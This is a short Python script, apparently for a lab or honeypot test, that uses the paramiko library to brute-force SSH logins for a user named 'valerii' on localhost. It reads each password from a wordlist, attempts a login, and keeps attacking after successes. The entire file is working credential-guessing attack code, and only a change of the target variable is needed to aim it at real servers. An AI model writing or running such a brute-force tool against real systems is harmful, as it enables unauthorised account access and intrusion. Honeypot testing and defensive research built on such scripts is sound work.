import paramiko
import socket
import time

TARGET = "localhost"
PORT = 22
USER = "valerii"

PASSWORD_FILE = "passwords.txt"

def brute_force():
    with open(PASSWORD_FILE, "r", encoding="utf-8", errors="ignore") as f:
        for pwd in f:
            pwd = pwd.strip()
            if not pwd:
                continue
            try:
                print(f"[INFO] Trying {USER}:{pwd}")
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(TARGET, port=PORT, username=USER, password=pwd, timeout=3)
                print(f"[✔] Login accepted (honeypot simulated): {pwd}")
                client.close()
                # do NOT stop, keep attacking
            except (paramiko.AuthenticationException, socket.error):
                print(f"[X] Wrong password: {pwd}")
            except Exception as e:
                print(f"[!] Error: {e}")
            time.sleep(0.2)  # slow down a bit
    print("\n[RESULT] Attack completed — all passwords tested")

if __name__ == "__main__":
    brute_force()
